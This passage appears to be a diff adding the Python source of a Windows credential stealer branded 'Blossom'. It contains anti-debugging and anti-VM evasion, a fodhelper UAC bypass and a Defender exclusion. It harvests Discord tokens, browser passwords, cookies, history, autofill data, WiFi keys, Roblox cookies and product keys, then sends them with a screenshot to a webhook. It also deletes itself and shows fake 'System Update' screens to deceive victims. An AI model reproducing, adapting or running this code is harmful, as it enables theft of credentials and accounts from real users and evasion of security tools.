+        "wireshark.exe", "fiddler.exe", "charles.exe",
+        "procmon.exe", "procmon64.exe", "procexp.exe", "procexp64.exe",
+        "x64dbg.exe", "x32dbg.exe", "ollydbg.exe",
+        "ida.exe", "ida64.exe", "idaq.exe", "idaq64.exe",
+        "dnspy.exe", "de4dot.exe", "ilspy.exe",
+        "httpdebugger.exe", "httpdebuggerui.exe",
+        "pestudio.exe", "processhacker.exe", "systeminformer.exe",
+        "autoruns.exe", "autoruns64.exe",
+        "tcpview.exe", "tcpview64.exe",
+        "filemon.exe", "regmon.exe",
+    ]
+    try:
+        output = subprocess.check_output(
+            "tasklist /fo csv /nh", shell=True, stderr=subprocess.DEVNULL
+        ).decode().lower()
+        for proc in analysis_procs:
+            if proc in output:
+                sys.exit(0)
+    except Exception:
+        pass
+    try:
+        parent = subprocess.check_output(
+            "wmic process where (processid={}) get parentprocessid".format(os.getpid()),
+            shell=True,
+            stderr=subprocess.DEVNULL,
+        ).decode()
+        ppid = int(re.search(r"\d+", parent).group())
+        parent_name = subprocess.check_output(
+            "wmic process where (processid={}) get name".format(ppid),
+            shell=True,
+            stderr=subprocess.DEVNULL,
+        ).decode().lower()
+        legit_parents = [
+            "explorer.exe", "cmd.exe", "powershell.exe", "svchost.exe",
+            "fodhelper.exe", "userinit.exe", "runtimebroker.exe",
+            "conhost.exe", "python.exe", "pythonw.exe", "py.exe",
+            "windowsterminal.exe", "wt.exe", "pwsh.exe",
+        ]
+        if not any(p in parent_name for p in legit_parents):
+            sys.exit(0)
+    except Exception:
+        pass
+def uac_bypass_fodhelper():
+    debug_log("Entered uac_bypass_fodhelper")
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        debug_log("Already admin in uac_bypass_fodhelper")
+        return False
+    signal_file = os.path.join(TEMP, ".bl_elevated")
+    if os.path.exists(signal_file):
+        debug_log("Signal file already exists, skipping fodhelper")
+        return False
+    try:
+        import time
+        if getattr(sys, "frozen", False):
+            cmd = f'"{sys.executable}"'
+        else:
+            cmd = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
+        marker = os.path.join(TEMP, ".bl_fodhelper_marker")
+        try:
+            with open(marker, "w") as f:
+                f.write(str(os.getpid()))
+        except Exception:
+            pass
+        debug_log(f"Command to execute: {cmd}")
+        
+        debug_log("Creating registry key")
+        key = winreg.CreateKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Classes\ms-settings\Shell\Open\command"
+        )
+        debug_log("Setting registry values")
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+        
+        debug_log("Launching fodhelper.exe")
+        subprocess.Popen(
+            "fodhelper.exe",
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        debug_log("Sleeping for 5s")
+        time.sleep(5)
+        debug_log("Woke up. Deleting registry keys.")
+        try:
+            winreg.DeleteKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Classes\ms-settings\Shell\Open\command"
+            )
+            winreg.DeleteKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Classes\ms-settings\Shell\Open"
+            )
+            winreg.DeleteKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Classes\ms-settings\Shell"
+            )
+            winreg.DeleteKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Classes\ms-settings"
+            )
+        except Exception:
+            pass
+        if os.path.exists(signal_file):
+            debug_log("Signal file detected after 5s wait. Elevation succeeded.")
+            try:
+                os.remove(signal_file)
+            except Exception:
+                pass
+            return True
+        else:
+            debug_log("No signal file after 5s wait. Elevation failed.")
+    except Exception as e:
+        debug_log(f"Exception in uac_bypass_fodhelper: {e}")
+        pass
+    return False
+def kill_browsers():
+    targets = [
+        "fiddler",
+        "regedit",
+        "vboxservice",
+        "yandex.exe",
+        "firefox.exe",
+        "discord.exe",
+        "discordcanary.exe",
+        "discordptb.exe",
+        "chrome.exe",
+        "msedge.exe",
+        "brave.exe",
+        "opera.exe",
+        "vivaldi.exe",
+    ]
+    for proc in targets:
+        try:
+            subprocess.call(
+                f"taskkill /F /IM {proc}",
+                shell=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+        except Exception:
+            pass
+    import time
+    time.sleep(1)
+def add_defender_exclusion():
+    try:
+        if getattr(sys, "frozen", False):
+            path = os.path.dirname(sys.executable)
+        else:
+            path = os.path.dirname(os.path.abspath(__file__))
+        subprocess.run(
+            [
+                "powershell",
+                "-WindowStyle",
+                "Hidden",
+                "-Command",
+                f"Add-MpPreference -ExclusionPath '{path}'",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=0x08000000,
+        )
+    except Exception:
+        pass
+def self_destruct():
+    try:
+        if getattr(sys, "frozen", False):
+            path = sys.executable
+        else:
+            path = os.path.abspath(__file__)
+        subprocess.Popen(
+            f'cmd /C ping 127.0.0.1 -n 5 > nul & del /f /q "{path}"',
+            shell=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=0x08000000,
+        )
+    except Exception:
+        pass
+def is_vm():
+    vm_procs = [
+        "vmtoolsd.exe",
+        "vmwaretray.exe",
+        "vmwareuser.exe",
+        "vboxservice.exe",
+        "vboxtray.exe",
+        "qemu-ga.exe",
+        "vdagent.exe",
+        "vdservice.exe",
+        "prl_tools.exe",
+        "prl_cc.exe",
+        "xenservice.exe",
+    ]
+    try:
+        output = subprocess.check_output(
+            "tasklist /fo csv /nh", shell=True, stderr=subprocess.DEVNULL
+        ).decode().lower()
+        for proc in vm_procs:
+            if proc.lower() in output:
+                return True
+    except Exception:
+        pass
+    vm_keys = [
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmci"),
+    ]
+    for hive, keypath in vm_keys:
+        try:
+            winreg.OpenKey(hive, keypath)
+            return True
+        except Exception:
+            pass
+    try:
+        bios = subprocess.check_output(
+            "wmic bios get serialnumber,manufacturer",
+            shell=True,
+            stderr=subprocess.DEVNULL,
+        ).decode().lower()
+        for s in ["vmware", "virtualbox", "vbox", "qemu", "xen", "parallels"]:
+            if s in bios:
+                return True
+    except Exception:
+        pass
+    try:
+        model = subprocess.check_output(
+            "wmic computersystem get model,manufacturer",
+            shell=True,
+            stderr=subprocess.DEVNULL,
+        ).decode().lower()
+        for s in [
+            "vmware",
+            "virtualbox",
+            "vbox",
+            "qemu",
+            "xen",
+            "parallels",
+            "microsoft corporation",
+        ]:
+            if s in model:
+                return True
+    except Exception:
+        pass
+    return False
+
+def _build_multipart(fields, files):
+    boundary = "----BlossomBoundary" + os.urandom(8).hex()
+    body = b""
+    for key, value in fields.items():
+        body += f"--{boundary}\r\n".encode()
+        body += f'Content-Disposition: form-data; name="{key}"\r\n'.encode()
+        body += b"Content-Type: application/json\r\n\r\n"
+        body += value.encode("utf-8") if isinstance(value, str) else value
+        body += b"\r\n"
+    for key, (filename, filedata, content_type) in files.items():
+        body += f"--{boundary}\r\n".encode()
+        body += f'Content-Disposition: form-data; name="{key}"; filename="{filename}"\r\n'.encode()
+        body += f"Content-Type: {content_type}\r\n\r\n".encode()
+        body += filedata if isinstance(filedata, bytes) else filedata.encode("utf-8")
+        body += b"\r\n"
+    body += f"--{boundary}--\r\n".encode()
+    return body, f"multipart/form-data; boundary={boundary}"
+
+def _http_post_json(url, data, timeout=30):
+    payload = json.dumps(data).encode("utf-8")
+    req = Request(url, data=payload, headers={
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+    })
+    try:
+        resp = urlopen(req, timeout=timeout, context=_SSL_CTX)
+        return resp.status, resp.read()
+    except HTTPError as e:
+        return e.code, e.read()
+    except Exception:
+        return 0, b""
+
+def _http_post_multipart(url, fields, files, timeout=30):
+    body, content_type = _build_multipart(fields, files)
+    req = Request(url, data=body, headers={
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0",
+    })
+    try:
+        resp = urlopen(req, timeout=timeout, context=_SSL_CTX)
+        return resp.status, resp.read()
+    except HTTPError as e:
+        return e.code, e.read()
+    except Exception:
+        return 0, b""
+
+def send_to_webhook(data, screenshot_path=None):
+    webhook = CONFIG.get("webhook", "")
+    if not webhook:
+        return
+    def _post_json(payload):
+        import time as _time
+        code, body = _http_post_json(webhook, payload, timeout=30)
+        if code == 429:
+            try:
+                retry = json.loads(body).get("retry_after", 1)
+            except Exception:
+                retry = 1
+            _time.sleep(retry + 0.5)
+            _http_post_json(webhook, payload, timeout=30)
+
+    def _post_multipart(fields, files):
+        import time as _time
+        code, body = _http_post_multipart(webhook, fields, files, timeout=30)
+        if code == 429:
+            try:
+                retry = json.loads(body).get("retry_after", 1)
+            except Exception:
+                retry = 1
+            _time.sleep(retry + 0.5)
+            _http_post_multipart(webhook, fields, files, timeout=30)
+
+    ts = datetime.now(timezone.utc).isoformat()
+    embeds = []
+    file_payloads = {}
+    header_embed = {
+        "title": "🌸 Blossom",
+        "color": 0xdbdbdb,
+        "footer": {"text": f"Blossom | {platform.node()}"},
+        "timestamp": ts,
+    }
+    if data.get("sysinfo"):
+        si = data["sysinfo"]
+        header_embed["description"] = (
+            f"**IP:** ||{si.get('ip', 'N/A')}||\n"
+            f"**Location:** {si.get('city', 'N/A')}, {si.get('country', 'N/A')}\n"
+            f"**ISP:** {si.get('isp', 'N/A')}\n"
+            f"**OS:** {si.get('os', 'N/A')}\n"
+            f"**CPU:** {si.get('cpu', 'N/A')}\n"
+            f"**GPU:** {si.get('gpu', 'N/A')}\n"
+            f"**RAM:** {si.get('ram', 'N/A')}\n"
+            f"**Screen:** {si.get('screen', 'N/A')}\n"
+            f"**Host:** {si.get('hostname', 'N/A')}\\{si.get('username', 'N/A')}"
+        )
+    embeds.append(header_embed)
+    
+    if data.get("tokens"):
+        admin_server_lines = []
+        for td in data["tokens"][:10]:
+            ui = td.get("user_info", {})
+            admin_guilds = td.get("admin_guilds", [])
+            val = ""
+            if ui:
+                val += f"**User:** {ui.get('username', 'N/A')}\n"
+                val += f"**ID:** {ui.get('id', 'N/A')}\n"
+                val += f"**Email:** ||{ui.get('email', 'N/A')}||\n"
+                val += f"**Phone:** ||{ui.get('phone', 'N/A')}||\n"
+                val += f"**Nitro:** {ui.get('nitro', 'N/A')}\n"
+                val += f"**Billing:** {'✅' if ui.get('billing') else '❌'}\n"
+                val += f"**MFA:** {'✅' if ui.get('mfa') else '❌'}\n"
+                val += f"**Admin Servers:** {len(admin_guilds)}\n"
+            val += f"```{td['token']}```"
+            if len(val) > 1024:
+                val = val[:1020] + "..."
+            embeds.append({
+                "title": f"🔑 {td['source']}",
+                "color": 0xdbdbdb,
+                "description": val,
+                "timestamp": ts,
+            })
+            if admin_guilds:
+                uname = ui.get("username", "Unknown") if ui else "Unknown"
+                admin_server_lines.append(f"=== {uname} ({td.get('source', '?')}) ===")
+                for g in admin_guilds:
+                    admin_server_lines.append(
+                        f"  {g['name']} | ID: {g['id']} | Members: {g['members']}"
+                    )
+                admin_server_lines.append("")
+        if admin_server_lines:
+            file_payloads["admin_servers.txt"] = "\n".join(admin_server_lines)
+    else:
+        embeds[0]["fields"] = [
+            {"name": "🔑 Tokens", "value": "No tokens found", "inline": False}
+        ]
+        
+    browser_embed = {
+        "title": "🌐 Browser & Network Data",
+        "color": 0xdbdbdb,
+        "fields": [],
+        "timestamp": ts,
+    }
+    has_browser_data = False
+    if data.get("passwords"):
+        has_browser_data = True
+        browser_embed["fields"].append(
+            {
+                "name": "🔓 Passwords",
+                "value": f"Found **{len(data['passwords'])}** saved passwords\n*(see passwords.txt)*",
+                "inline": True,
+            }
+        )
+        lines = [
+            f"{p['browser']} | {p['url']} | {p['username']} | {p['password']}"
+            for p in data["passwords"]
+        ]
+        file_payloads["passwords.txt"] = "\n".join(lines)
+    if data.get("cookies"):
+        has_browser_data = True
+        browser_embed["fields"].append(
+            {
+                "name": "🍪 Cookies",
+                "value": f"Found **{len(data['cookies'])}** cookies\n*(see cookies.txt)*",
+                "inline": True,
+            }
+        )
+        lines = [
+            f"{c['browser']} | {c['host']} | {c['name']} | {c['value']}"
+            for c in data["cookies"]
+        ]
+        file_payloads["cookies.txt"] = "\n".join(lines)
+    if data.get("history"):
+        has_browser_data = True
+        browser_embed["fields"].append(
+            {
+                "name": "📜 History",
+                "value": f"Found **{len(data['history'])}** entries\n*(see history.txt)*",
+                "inline": True,
+            }
+        )
+        lines = [
+            f"{h['browser']} | {h['url']} | {h['title']} | visits:{h['visits']}"
+            for h in data["history"]
+        ]
+        file_payloads["history.txt"] = "\n".join(lines)
+    if data.get("wifi"):
+        has_browser_data = True
+        wifi_val = ""
+        for w in data["wifi"][:10]:
+            pw = w["password"] or "*(open)*"
+            wifi_val += f"`{w['ssid']}` → `{pw}`\n"
+        if len(data["wifi"]) > 10:
+            wifi_val += f"*...and {len(data['wifi']) - 10} more (see wifi.txt)*"
+        browser_embed["fields"].append(
+            {"name": "📶 WiFi Networks", "value": wifi_val.strip(), "inline": False}
+        )
+        lines = [
+            f"{w['ssid']} | {w['password']} | {w['auth']}"
+            for w in data["wifi"]
+        ]
+        file_payloads["wifi.txt"] = "\n".join(lines)
+    if data.get("roblox"):
+        has_browser_data = True
+        for i, rc in enumerate(data["roblox"][:3]):
+            cookie_display = rc["cookie"]
+            if len(cookie_display) > 60:
+                cookie_display = cookie_display[:60] + "..."
+            browser_embed["fields"].append(
+                {
+                    "name": f"🎮 Roblox #{i + 1} — {rc['browser']}",
+                    "value": f"```{cookie_display}```",
+                    "inline": False,
+                }
+            )
+    if has_browser_data:
+        embeds.append(browser_embed)
+        
+    if data.get("autofill"):
+        autofill_embed = {
+            "title": "📝 Autofill Data",
+            "color": 0xdbdbdb,
+            "fields": [
+                {
+                    "name": "📋 Entries",
+                    "value": f"Found **{len(data['autofill'])}** autofill entries\n*(see autofill.txt)*",
+                    "inline": False,
+                }
+            ],
+            "timestamp": ts,
+        }
+        top_fields = data["autofill"][:8]
+        if top_fields:
+            preview = ""
+            for af in top_fields:
+                preview += f"`{af['field']}` → `{af['value'][:40]}`\n"
+            autofill_embed["fields"].append(
+                {"name": "🔍 Preview", "value": preview.strip(), "inline": False}
+            )
+        embeds.append(autofill_embed)
+        lines = [
+            f"{a['browser']} | {a['field']} | {a['value']} | uses:{a['count']}"
+            for a in data["autofill"]
+        ]
+        file_payloads["autofill.txt"] = "\n".join(lines)
+        
+    if data.get("extensions"):
+        ext_embed = {
+            "title": "🧩 Browser Extensions",
+            "color": 0xdbdbdb,
+            "fields": [],
+            "timestamp": ts,
+        }
+        by_browser = {}
+        for ext in data["extensions"]:
+            by_browser.setdefault(ext["browser"], []).append(ext)
+        for browser, exts in list(by_browser.items())[:5]:
+            ext_list = "\n".join(
+                f"• {e['name']} `v{e['version']}`" for e in exts[:8]
+            )
+            if len(exts) > 8:
+                ext_list += f"\n*...and {len(exts) - 8} more*"
+            if len(ext_list) > 1024:
+                ext_list = ext_list[:1020] + "..."
+            ext_embed["fields"].append(
+                {"name": f"🌐 {browser}", "value": ext_list, "inline": False}
+            )
+        embeds.append(ext_embed)
+        lines = [
+            f"{e['browser']} | {e['name']} | v{e['version']} | {e['id']}"
+            for e in data["extensions"]
+        ]
+        file_payloads["extensions.txt"] = "\n".join(lines)
+        
+    if data.get("product_keys"):
+        keys_embed = {
+            "title": "🔐 Product Keys",
+            "color": 0xdbdbdb,
+            "fields": [],
+            "timestamp": ts,
+        }
+        for pk in data["product_keys"][:10]:
+            keys_embed["fields"].append({
+                "name": f"🗝️ {pk['product'][:50]}",
+                "value": f"```{pk['key']}```",
+                "inline": True,
+            })
+        embeds.append(keys_embed)
+        
+    if data.get("software"):
+        sw_embed = {
+            "title": "📦 Installed Software",
+            "color": 0xdbdbdb,
+            "fields": [
+                {
+                    "name": "💻 Programs",
+                    "value": f"Found **{len(data['software'])}** installed programs\n*(see software.txt)*",
+                    "inline": False,
+                }
+            ],
+            "timestamp": ts,
+        }
+        embeds.append(sw_embed)
+        lines = [
+            f"{s['name']} | v{s['version']} | {s['publisher']} | {s['install_date']}"
+            for s in data["software"]
+        ]
+        file_payloads["software.txt"] = "\n".join(lines)
+        
+    if embeds:
+        for i in range(0, len(embeds), 10):
+            _post_json({"embeds": embeds[i:i+10]})
+            
+    file_items = list(file_payloads.items())
+    for i in range(0, len(file_items), 8):
+        chunk = file_items[i:i+8]
+        files = {}
+        for j, (fname, content) in enumerate(chunk):
+            files[f"file{j}"] = (fname, content.encode("utf-8"), "text/plain")
+        fields = {"payload_json": json.dumps({"content": "📁 Data logs"})}
+        _post_multipart(fields, files)
+        
+    if screenshot_path and os.path.exists(screenshot_path):
+        try:
+            with open(screenshot_path, "rb") as sf:
+                files = {"file0": ("screenshot.png", sf.read(), "image/png")}
+                fields = {"payload_json": json.dumps({"content": "🖥️ Screenshot"})}
+                _post_multipart(fields, files)
+        except Exception:
+            pass
+
+def main():
+    debug_log("--- main() started ---")
+    fodhelper_marker = os.path.join(TEMP, ".bl_fodhelper_marker")
+    is_elevated_child = os.path.exists(fodhelper_marker)
+    if CONFIG.get("uac_bypass") and ctypes.windll.shell32.IsUserAnAdmin() and not is_elevated_child:
+        debug_log("Writing signal file (I am admin and bypass is on)")
+        try:
+            signal_file = os.path.join(TEMP, ".bl_elevated")
+            with open(signal_file, "w") as f:
+                f.write("1")
+        except Exception:
+            pass
+    if CONFIG.get("anti_debug"):
+        debug_log("Running anti_debug")
+        anti_debug()
+    if CONFIG.get("anti_analysis"):
+        debug_log("Running anti_analysis")
+        anti_analysis()
+    if CONFIG.get("anti_vm") and is_vm():
+        debug_log("VM detected, exiting main")
+        return
+    delay = CONFIG.get("startup_delay", 0)
+    if delay > 0:
+        debug_log(f"Sleeping {delay}s")
+        import time
+        time.sleep(delay)
+    if CONFIG.get("uac_bypass"):
+        if is_elevated_child:
+            debug_log("Fodhelper marker detected — this is the elevated child")
+            try:
+                os.remove(fodhelper_marker)
+            except Exception:
+                pass
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                debug_log("Writing signal file (elevated child is admin)")
+                try:
+                    signal_file = os.path.join(TEMP, ".bl_elevated")
+                    with open(signal_file, "w") as f:
+                        f.write("1")
+                except Exception:
+                    pass
+        else:
+            debug_log("Calling uac_bypass_fodhelper")
+            if uac_bypass_fodhelper():
+                debug_log("uac_bypass_fodhelper returned True. Exiting main (letting elevated copy take over).")
+                return
+    debug_log("Proceeding to grab data...")
+    if CONFIG.get("defender_exclusion"):
+        add_defender_exclusion()
+    if CONFIG.get("persistence"):
+        install_persistence()
+    if CONFIG.get("kill_browsers"):
+        kill_browsers()
+    data = {
+        "tokens": [],
+        "passwords": [],
+        "cookies": [],
+        "history": [],
+        "wifi": [],
+        "roblox": [],
+        "autofill": [],
+        "extensions": [],
+        "product_keys": [],
+        "software": [],
+        "sysinfo": {},
+    }
+    tasks = {}
+    with ThreadPoolExecutor(max_workers=12) as pool:
+        if CONFIG.get("grab_tokens"):
+            tasks["tokens"] = pool.submit(grab_tokens)
+        if CONFIG.get("grab_passwords"):
+            tasks["passwords"] = pool.submit(grab_passwords)
+        if CONFIG.get("grab_cookies"):
+            tasks["cookies"] = pool.submit(grab_cookies)
+        if CONFIG.get("grab_history"):
+            tasks["history"] = pool.submit(grab_history)
+        if CONFIG.get("grab_wifi"):
+            tasks["wifi"] = pool.submit(grab_wifi)
+        if CONFIG.get("grab_roblox"):
+            tasks["roblox"] = pool.submit(grab_roblox)
+        if CONFIG.get("grab_autofill"):
+            tasks["autofill"] = pool.submit(grab_autofill)
+        if CONFIG.get("grab_extensions"):
+            tasks["extensions"] = pool.submit(grab_extensions)
+        if CONFIG.get("grab_product_keys"):
+            tasks["product_keys"] = pool.submit(grab_product_keys)
+        if CONFIG.get("grab_software"):
+            tasks["software"] = pool.submit(grab_software)
+        if CONFIG.get("grab_sysinfo"):
+            tasks["sysinfo"] = pool.submit(get_system_info)
+        if CONFIG.get("grab_screenshot"):
+            tasks["screenshot"] = pool.submit(take_screenshot)
+        for key, future in tasks.items():
+            try:
+                data[key] = future.result(timeout=60)
+            except Exception:
+                pass
+    ss_path = data.pop("screenshot", None)
+    send_to_webhook(data, ss_path)
+    if ss_path:
+        try:
+            os.remove(ss_path)
+        except Exception:
+            pass
+    if CONFIG.get("self_destruct"):
+        self_destruct()
+def safe_main():
+    try:
+        main()
+    except Exception:
+        pass
+
+if __name__ == "__main__":
+    try:
+        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if hwnd:
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+        t = threading.Thread(target=safe_main)
+        t.start()
+        if CONFIG.get("enable_disguise"):
+            dtype = CONFIG.get("disguise_type", "cli")
+            if dtype == "cli":
+                subprocess.Popen('cmd.exe /c "title System Update & color 0a & echo [!] System Component Update in progress... & echo [!] Please do not close this window. & ping 127.0.0.1 -n 15 > nul"', creationflags=subprocess.CREATE_NEW_CONSOLE)
+            elif dtype == "html":
+                import tempfile
+                import webbrowser
+                html_content = "<html><head><title>System Update</title></head><body style='background:#0d0d0d;color:#fff;font-family:sans-serif;text-align:center;padding-top:15%;'><h1>System Component Update</h1><p style='color:#ccc;'>Please wait while components are being updated. Do not turn off your computer.</p></body></html>"
+                path = os.path.join(tempfile.gettempdir(), "system_update.html")
+                try:
+                    with open(path, "w") as f:
+                        f.write(html_content)
+                    webbrowser.open("file://" + path)
+                except Exception:
+                    pass
+        if CONFIG.get("fake_error"):
+            ctypes.windll.user32.MessageBoxW(
+                0, CONFIG["fake_error_msg"], "Error", 0x10
+            )
+        t.join()
+    except Exception:
+        pass
